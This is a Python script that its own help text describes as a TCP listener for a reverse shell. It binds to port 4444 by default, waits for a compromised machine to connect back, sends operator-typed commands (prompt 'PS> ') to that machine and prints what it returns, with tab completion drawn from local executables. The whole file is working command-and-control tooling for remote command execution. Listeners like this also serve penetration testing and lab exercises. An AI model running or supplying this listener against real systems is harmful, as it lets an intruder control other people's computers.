import socket
import threading
import sys
import os
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter

def get_system_commands():
    paths = os.environ.get("PATH", "").split(os.pathsep)
    exts = os.environ.get("PATHEXT", "").split(os.pathsep) if os.name == 'nt' else ['']
    commands = set()

    for path in paths:
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                if os.access(full_path, os.X_OK):
                    for ext in exts:
                        if item.endswith(ext) or ext == '':
                            commands.add(item)
        except FileNotFoundError:
            continue

    common_cmds = ['cd', 'ls', 'cat', 'exit', 'whoami', 'clear', 'help', 'pwd', 'echo']
    return list(commands.union(common_cmds))

COMMANDS = get_system_commands()
command_completer = WordCompleter(COMMANDS, ignore_case=True, match_middle=True)
session = PromptSession(completer=command_completer)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            try:
                cmd = session.prompt("PS> ")
            except (EOFError):
                break
            except KeyboardInterrupt:
                answer = input("\nDo you want to terminate the listener? (y/N): ").strip().lower()
                if answer in ('y', 'yes'):
                    print("[+] Listener terminated by user.")
                    break
                else:
                    continue
            if not cmd.strip():
                continue
            if cmd.strip().lower() == 'clear':
                clear_screen()
                continue
            conn.sendall((cmd + '\n').encode('utf-8'))
            data = b''
            while True:
                part = conn.recv(4096)
                if not part:
                    break
                data += part
                if len(part) < 4096:
                    break
            output = data.decode('utf-8', errors='replace')
            print(output, end='')
            sys.stdout.flush()
            if cmd.strip().lower() in ('exit', 'quit'):
                break
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()
        print("[+] Connection closed.")

def start_listener(host='0.0.0.0', port=4444):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        print(f"\n[+] Listening on {host}:{port} ...")
        conn, addr = s.accept()
        handle_client(conn, addr)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='TCP Listener for Reverse Shell (Interactive with Autocomplete)')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=4444, help='Port to bind (default: 4444)')
    args = parser.parse_args()
    start_listener(args.host, args.port)
